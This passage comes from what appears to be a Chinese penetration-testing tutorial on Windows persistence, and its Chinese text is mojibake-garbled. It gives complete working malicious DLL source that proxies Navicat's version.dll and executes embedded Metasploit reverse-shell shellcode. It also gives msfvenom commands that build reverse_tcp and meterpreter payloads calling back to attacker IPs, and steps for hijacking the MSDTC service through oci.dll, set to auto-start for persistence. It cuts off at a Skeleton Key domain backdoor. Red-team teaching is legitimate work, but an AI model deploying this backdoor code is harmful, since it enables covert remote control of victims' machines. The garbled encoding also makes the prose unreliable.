çš„å€¼ä¸º1å¤–ï¼Œå…¶ä½™ä¸‰ä¸ªé”®éƒ½ä¸å­˜åœ¨ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨åˆ›å»ºã€‚å¹¶ä¸”ï¼Œè§¦å‘çš„æ¶æ„ç¨‹åºåªèƒ½åœ¨å½“å‰ç”¨æˆ·çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œã€‚</p><p><img src="http://cdn.clown2024.cn/202407151710515.png" alt="image-20240417164930891"></p><h2 id="dllåŠ«æŒ"><a href="#DLLåŠ«æŒ" class="headerlink" title="DLLåŠ«æŒ"></a>DLLåŠ«æŒ</h2><p>ä¹‹å‰UACBypassä¹Ÿç”¨è¿‡è¿™é¡¹æŠ€æœ¯ï¼Œè¿™é‡Œé€šè¿‡DLLåŠ«æŒæ¥å»ºç«‹æŒä¹…åŒ–åé—¨ï¼Œè¯¥æ–¹æ³•éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚</p><p><strong>åŠ«æŒåº”ç”¨ç¨‹åº</strong></p><p>ä»¥Navicat Premium 15ä¸ºä¾‹ã€‚</p><p>å¯åŠ¨Navicatç„¶åé€šè¿‡Process Monitorç›‘æ§å…¶è¿›ç¨‹ï¼Œè¿‡æ»¤å‡ºåŠ è½½çš„DLLï¼Œå¯ä»¥çœ‹å‡ºï¼Œnavicat.exeè¿›ç¨‹åŠ è½½DLLæ–‡ä»¶çš„é¡ºåºã€‚</p><p><img src="http://cdn.clown2024.cn/202407151710516.png" alt="image-20240417165957692"></p><blockquote><p>Navicaté¦–å…ˆå°è¯•åœ¨è‡ªèº«çš„å®‰è£…ç›®å½•ä¸­åŠ è½½ version.dllï¼Œä½†æ˜¯å®‰è£…ç›®å½•ä¸­ version.dll ä¸å­˜åœ¨ï¼Œæ‰€ä»¥ä¼šç»§ç»­å°è¯•åœ¨ç³»ç»Ÿç›®å½•C:\Windows\System32ä¸­åŠ è½½version.dllï¼Œå¹¶æˆåŠŸåŠ è½½</p></blockquote><p>ä¾ç…§è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ„é€ æ¶æ„DLLæ”¾å…¥Navicatçš„å®‰è£…ç›®å½•ã€‚</p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæ„é€ çš„æ¶æ„ DLL éœ€è¦ä¸åŸæ¥çš„åˆæ³• DLL å…·æœ‰ç›¸åŒçš„å¯¼å‡ºå‡½æ•°ã€‚å¯ä»¥ä½¿ç”¨ AheadLib å·¥å…·è·å–åˆæ³•çš„ version.dll çš„å¯¼å‡ºå‡½æ•°ï¼Œå¹¶è‡ªåŠ¨åŒ–ç”ŸæˆåŠ«æŒä»£ç ã€‚</p><p>åœ¨â€œè¾“å…¥ DLLâ€ä¸­å¡«å…¥åˆæ³• DLL çš„ç»å¯¹è·¯å¾„ï¼Œåœ¨â€œè¾“å‡ºCPPâ€ä¸­å¡«å…¥ç”Ÿæˆçš„åŠ«æŒä»£ç çš„ä¿å­˜è·¯å¾„ï¼Œåœ¨â€œè½¬å‘â€ä¸­å‹¾é€‰â€œç›´æ¥è½¬å‘å‡½æ•°â€ï¼Œâ€œåŸå§‹DLLâ€ä¸­çš„å€¼è®¾ä¸ºâ€œversionOrgâ€œ</p><p><img src="http://cdn.clown2024.cn/202407151710517.png" alt="image-20240417170341170"></p><p>ç‚¹å‡»ç”Ÿæˆå°±èƒ½ç”Ÿæˆä¸€ä»½åŠ«æŒä»£ç ï¼Œè¿™æ˜¯ç”Ÿæˆçš„ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><br><br><br><span class="hljs-comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// å¤´æ–‡ä»¶</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><br><br><br><span class="hljs-comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// å¯¼å‡ºå‡½æ•°</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoA=versionOrg.GetFileVersionInfoA,@1&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoByHandle=versionOrg.GetFileVersionInfoByHandle,@2&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoExA=versionOrg.GetFileVersionInfoExA,@3&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoExW=versionOrg.GetFileVersionInfoExW,@4&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoSizeA=versionOrg.GetFileVersionInfoSizeA,@5&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoSizeExA=versionOrg.GetFileVersionInfoSizeExA,@6&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoSizeExW=versionOrg.GetFileVersionInfoSizeExW,@7&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoSizeW=versionOrg.GetFileVersionInfoSizeW,@8&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoW=versionOrg.GetFileVersionInfoW,@9&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerFindFileA=versionOrg.VerFindFileA,@10&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerFindFileW=versionOrg.VerFindFileW,@11&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerInstallFileA=versionOrg.VerInstallFileA,@12&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerInstallFileW=versionOrg.VerInstallFileW,@13&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerLanguageNameA=versionOrg.VerLanguageNameA,@14&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerLanguageNameW=versionOrg.VerLanguageNameW,@15&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerQueryValueA=versionOrg.VerQueryValueA,@16&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerQueryValueW=versionOrg.VerQueryValueW,@17&quot;</span>)</span><br><span class="hljs-comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><br><br><br><span class="hljs-comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// å…¥å£å‡½æ•°</span><br><span class="hljs-function">BOOL WINAPI <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)<br>&#123;<br><span class="hljs-built_in">DisableThreadLibraryCalls</span>(hModule);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (dwReason == DLL_PROCESS_DETACH)<br>&#123;<br>&#125;<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><br></code></pre></td></tr></table></figure><p>è¯¥ä»£ç é€šè¿‡pragmaé¢„å¤„ç†æŒ‡ä»¤å®ç°å‡½æ•°è½¬å‘ï¼Œä»¥ç¡®ä¿åº”ç”¨ç¨‹åºèƒ½æ­£å¸¸å¯åŠ¨ã€‚</p><p>åº”ç”¨ç¨‹åºçš„è¿è¡Œä¾èµ–äºåŸå§‹ DLL æ–‡ä»¶ä¸­æä¾›çš„å‡½æ•°ï¼Œæ¶æ„ DLL å¿…é¡»æä¾›ç›¸åŒåŠŸèƒ½çš„å‡½æ•°æ‰èƒ½ä¿è¯ç¨‹åºçš„æ­£å¸¸è¿è¡Œã€‚å› æ­¤ç¼–å†™ DILåŠ«æŒä»£ç æ—¶ï¼Œéœ€è¦é€šè¿‡å‡½æ•°è½¬å‘ï¼Œå°†åº”ç”¨ç¨‹åºè°ƒç”¨çš„å‡½æ•°ä»æ¶æ„ DILé‡å®šå‘åˆ°åŸå§‹çš„åˆæ³• DLLã€‚</p><blockquote><p>ä¾‹å¦‚åœ¨ä¸Šè¿°ä»£ç ä¸­,å½“ Navicatéœ€è¦è°ƒç”¨åˆæ³• DLL æ–‡ä»¶ä¸­çš„ GetFileVersionInfoA å‡½æ•°æ—¶ï¼Œç³»ç»Ÿä¼šæ ¹æ®ç»™å‡ºçš„ pragma æŒ‡ä»¤ç›´æ¥è½¬å‘ç»™ versionOrg.dll ä¸­çš„ GetFileVersionInfoA å‡½æ•°å»æ‰§è¡Œã€‚ç”±äºåŠ«æŒçš„åŸå§‹ DLL(version.dll)ä½äºSystem32 ç›®å½•ä¸­ï¼Œå› æ­¤éœ€è¦å°† pragmaæŒ‡ä»¤ä¸­çš„â€œversionOrgâ€æ›¿æ¢æˆC:\Windows\System32\versionâ€(è·¯å¾„ä¸­çš„åæ–œæ éœ€è¦è½¬ä¹‰)ã€‚</p></blockquote><p>ç„¶åæˆ‘ä»¬éœ€è¦ç¼–å†™ä¸€ä¸ªDoMagicå‡½æ•°ï¼Œç”¨æ¥ç”³è¯·è™šæ‹Ÿå†…å­˜å¹¶æ‰§è¡ŒMetasploitç”Ÿæˆçš„ShellCode</p><p>msfç”Ÿæˆshellcodeçš„æŒ‡ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">msfvenom -p windows/shell/reverse_tcp LHOST=192.168.28.0 LPORT=2333 -a x86 -f c<br></code></pre></td></tr></table></figure><p>DoMagicå‡½æ•°çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//ç”³è¯·å†…å­˜å¹¶æ‰§è¡ŒShellCode</span><br>DWORD WINAPI <span class="hljs-title function_">DoMagic</span><span class="hljs-params">(LPVOID lpParameter)</span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] =<br><span class="hljs-string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52&quot;</span><br><span class="hljs-string">&quot;\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26&quot;</span><br><span class="hljs-string">&quot;\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d&quot;</span><br><span class="hljs-string">&quot;\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01&quot;</span><br><span class="hljs-string">&quot;\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x50&quot;</span><br><span class="hljs-string">&quot;\x8b\x48\x18\x01\xd3\x85\xc9\x74\x3c\x49\x8b\x34\x8b\x31&quot;</span><br><span class="hljs-string">&quot;\xff\x01\xd6\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75&quot;</span><br><span class="hljs-string">&quot;\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;</span><br><span class="hljs-string">&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01&quot;</span><br><span class="hljs-string">&quot;\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58&quot;</span><br><span class="hljs-string">&quot;\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00&quot;</span><br><span class="hljs-string">&quot;\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8&quot;</span><br><span class="hljs-string">&quot;\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80&quot;</span><br><span class="hljs-string">&quot;\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x14\x80\x68\x02\x00&quot;</span><br><span class="hljs-string">&quot;\x09\x1d\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span><br><span class="hljs-string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74&quot;</span><br><span class="hljs-string">&quot;\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67&quot;</span><br><span class="hljs-string">&quot;\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f&quot;</span><br><span class="hljs-string">&quot;\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10&quot;</span><br><span class="hljs-string">&quot;\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53&quot;</span><br><span class="hljs-string">&quot;\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8&quot;</span><br><span class="hljs-string">&quot;\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b&quot;</span><br><span class="hljs-string">&quot;\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e&quot;</span><br><span class="hljs-string">&quot;\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span><br><span class="hljs-string">&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a&quot;</span><br><span class="hljs-string">&quot;\x00\x53\xff\xd5&quot;</span>;<br>    <span class="hljs-type">void</span>* exec = VirtualAlloc(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(exec, shellcode,<span class="hljs-keyword">sizeof</span> shellcode);<br>    ((<span class="hljs-type">void</span>(*)())exec)();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>DllMainå‡½æ•°æ—¶æ•´ä¸ªDLLæ–‡ä»¶çš„å…¥å£å‡½æ•°ï¼Œå¯ä»¥åˆ›å»ºçº¿ç¨‹è°ƒç”¨åŠ«æŒåéœ€è¦è¿›è¡Œçš„åŠŸèƒ½ã€‚åœ¨DllMainå‡½æ•°ä¸­æ·»åŠ ä»¥ä¸‹ä»£ç ï¼Œåˆ›å»ºè¿›ç¨‹è°ƒç”¨DoMagicå‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">HANDLE hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, DoMagic, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(hThread)&#123;<br>    CloseHandle(hThread);<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆçš„DLLåŠ«æŒä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// å¤´æ–‡ä»¶</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-comment">// å¯¼å‡ºå‡½æ•°</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoA=versionOrg.GetFileVersionInfoA,@1&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoByHandle=versionOrg.GetFileVersionInfoByHandle,@2&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoExA=versionOrg.GetFileVersionInfoExA,@3&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoExW=versionOrg.GetFileVersionInfoExW,@4&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoSizeA=versionOrg.GetFileVersionInfoSizeA,@5&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoSizeExA=versionOrg.GetFileVersionInfoSizeExA,@6&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoSizeExW=versionOrg.GetFileVersionInfoSizeExW,@7&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoSizeW=versionOrg.GetFileVersionInfoSizeW,@8&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoW=versionOrg.GetFileVersionInfoW,@9&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerFindFileA=versionOrg.VerFindFileA,@10&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerFindFileW=versionOrg.VerFindFileW,@11&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerInstallFileA=versionOrg.VerInstallFileA,@12&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerInstallFileW=versionOrg.VerInstallFileW,@13&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerLanguageNameA=versionOrg.VerLanguageNameA,@14&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerLanguageNameW=versionOrg.VerLanguageNameW,@15&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerQueryValueA=versionOrg.VerQueryValueA,@16&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerQueryValueW=versionOrg.VerQueryValueW,@17&quot;</span>)</span><br><br><span class="hljs-comment">//ç”³è¯·å†…å­˜å¹¶æ‰§è¡ŒShellCode</span><br>DWORD WINAPI <span class="hljs-title function_">DoMagic</span><span class="hljs-params">(LPVOID lpParameter)</span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] =<br><span class="hljs-string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52&quot;</span><br><span class="hljs-string">&quot;\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26&quot;</span><br><span class="hljs-string">&quot;\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d&quot;</span><br><span class="hljs-string">&quot;\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01&quot;</span><br><span class="hljs-string">&quot;\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x50&quot;</span><br><span class="hljs-string">&quot;\x8b\x48\x18\x01\xd3\x85\xc9\x74\x3c\x49\x8b\x34\x8b\x31&quot;</span><br><span class="hljs-string">&quot;\xff\x01\xd6\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75&quot;</span><br><span class="hljs-string">&quot;\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;</span><br><span class="hljs-string">&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01&quot;</span><br><span class="hljs-string">&quot;\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58&quot;</span><br><span class="hljs-string">&quot;\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00&quot;</span><br><span class="hljs-string">&quot;\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8&quot;</span><br><span class="hljs-string">&quot;\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80&quot;</span><br><span class="hljs-string">&quot;\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x14\x80\x68\x02\x00&quot;</span><br><span class="hljs-string">&quot;\x09\x1d\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span><br><span class="hljs-string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74&quot;</span><br><span class="hljs-string">&quot;\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67&quot;</span><br><span class="hljs-string">&quot;\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f&quot;</span><br><span class="hljs-string">&quot;\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10&quot;</span><br><span class="hljs-string">&quot;\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53&quot;</span><br><span class="hljs-string">&quot;\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8&quot;</span><br><span class="hljs-string">&quot;\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b&quot;</span><br><span class="hljs-string">&quot;\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e&quot;</span><br><span class="hljs-string">&quot;\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span><br><span class="hljs-string">&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a&quot;</span><br><span class="hljs-string">&quot;\x00\x53\xff\xd5&quot;</span>;<br>    <span class="hljs-type">void</span>* exec = VirtualAlloc(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(exec, shellcode,<span class="hljs-keyword">sizeof</span> shellcode);<br>    ((<span class="hljs-type">void</span>(*)())exec)();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// å…¥å£å‡½æ•°</span><br>BOOL WINAPI <span class="hljs-title function_">DllMain</span><span class="hljs-params">(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span><br>&#123;<br><span class="hljs-keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)<br>&#123;<br>DisableThreadLibraryCalls(hModule);<br>        HANDLE hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, DoMagic, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span>(hThread)&#123;<br>    CloseHandle(hThread);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (dwReason == DLL_PROCESS_DETACH)<br>&#123;<br>&#125;<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨Visual Studioåˆ›å»ºDLLé¡¹ç›®è¿›è¡Œç¼–è¯‘ï¼Œä»¥ç”Ÿæˆæ¶æ„çš„version.dll</p><p><img src="http://cdn.clown2024.cn/202407151710518.png" alt="image-20240418224137630"></p><p>ç„¶åå°†ç”Ÿæˆçš„æ¶æ„dllæ”¾å…¥Navicatå®‰è£…ç›®å½•å³å¯ï¼Œä¸è¿‡åæœŸè¿™äº›åº”è¯¥éƒ½è¦åšå…æ€æ‰è¡Œï¼Œæœ¬åœ°ç”Ÿæˆç«‹é©¬å°±æ‹¦äº†</p><p><img src="http://cdn.clown2024.cn/202407151710519.png" alt="image-20240418224240983"></p><p><strong>åŠ«æŒç³»ç»ŸæœåŠ¡</strong></p><p>MSDTC(Distributed Transaction Coordinatorï¼Œåˆ†å¸ƒå¼äº‹åŠ¡å¤„ç†åè°ƒå™¨)æ˜¯ Windowsç³»ç»ŸæœåŠ¡ï¼Œè´Ÿè´£åè°ƒè·¨å¤šä¸ªæ•°æ®åº“ã€æ¶ˆæ¯é˜Ÿåˆ—ã€æ–‡ä»¶ç³»ç»Ÿç­‰èµ„æºç®¡ç†å™¨çš„äº‹åŠ¡ã€‚</p><p>MSDTC æœåŠ¡å¯åŠ¨åï¼Œå°†å°è¯•åœ¨C:\Windows\System32ç›®å½•ä¸­åŠ è½½oci.dll æ–‡ä»¶ï¼Œä½†æ˜¯è¯¥æ–‡ä»¶ä¸å­˜åœ¨</p><p><img src="http://cdn.clown2024.cn/202407151710520.png" alt="image-20240417183948223"></p><p>æµ‹è¯•äººå‘˜å¯ä»¥åˆ¶ä½œä¸€ä¸ªåŒåçš„æ¶æ„DLLå¹¶æ”¾å…¥System32ç›®å½•ã€‚å½“MSDTCæœåŠ¡å¯åŠ¨æ—¶ï¼Œæ¶æ„DLLå°†åŠ è½½åˆ°msdtc.exeè¿›ç¨‹ã€‚</p><p>å¯ä»¥ç”¨Metasploitç›´æ¥ç”Ÿæˆä¸€ä¸ªæ¶æ„DLL</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -p Windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.143 LPORT=4444 -f dll -o oci.dll<br></code></pre></td></tr></table></figure><p>ç”Ÿæˆä¸€ä¸ªoci.dllæ–‡ä»¶ç„¶åä¸Šä¼ åˆ°C:\Windows\System32ç›®å½•ä¸‹ï¼Œå½“ç³»ç»ŸæœåŠ¡é‡å¯æ—¶ï¼Œç›®æ ‡ä¸»æœºå°±ä¼šé‡æ–°ä¸Šçº¿ï¼Œå¹¶ä¸”æƒé™ä¸ºNETWORK SERVICEã€‚</p><p>åœ¨æŸäº›ç‰ˆæœ¬ä¸­MSDTCæœåŠ¡çš„å¯åŠ¨ç±»å‹é»˜è®¤ä¸ºâ€æ‰‹åŠ¨â€ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ä¸ºè‡ªåŠ¨å®ç°æƒé™æŒä¹…åŒ–</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc config msdtc start= &quot;auto&quot;<br></code></pre></td></tr></table></figure><h1 id="å¸¸è§åŸŸåé—¨æŠ€æœ¯"><a href="#å¸¸è§åŸŸåé—¨æŠ€æœ¯" class="headerlink" title="å¸¸è§åŸŸåé—¨æŠ€æœ¯"></a>å¸¸è§åŸŸåé—¨æŠ€æœ¯</h1><p>å½“è·å–åŸŸæ§åˆ¶å™¨çš„æƒé™åï¼Œä¸ºäº†é˜²æ­¢å¯¹åŸŸæ§åˆ¶å™¨æƒé™çš„ä¸¢å¤±ï¼Œæµ‹è¯•äººå‘˜éœ€è¦ä½¿ç”¨äº›ç‰¹å®šçš„æŒä¹…åŒ–æŠ€æœ¯æ¥ç»´æŒå·²è·å–åˆ°çš„åŸŸæƒé™ã€‚</p><h2 id="åˆ›å»ºskeleton-keyåŸŸåé—¨"><a href="#åˆ›å»ºSkeleton-KeyåŸŸåé—¨" class="headerlink" title="åˆ›å»ºSkeleton KeyåŸŸåé—¨"></a>åˆ›å»ºSkeleton KeyåŸŸåé—¨</h2><p>Skeleton Key å³â€œä¸‡èƒ½é’¥åŒ™â€ã€‚é€šè¿‡åœ¨åŸŸæ§åˆ¶å™¨ä¸Šå®‰è£… Skeleton Keyï¼Œæ‰€æœ‰åŸŸç”¨æˆ·è´¦æˆ·éƒ½å¯ä»¥ä½¿ç”¨ä¸€ä¸ªç›¸åŒçš„å¯†ç 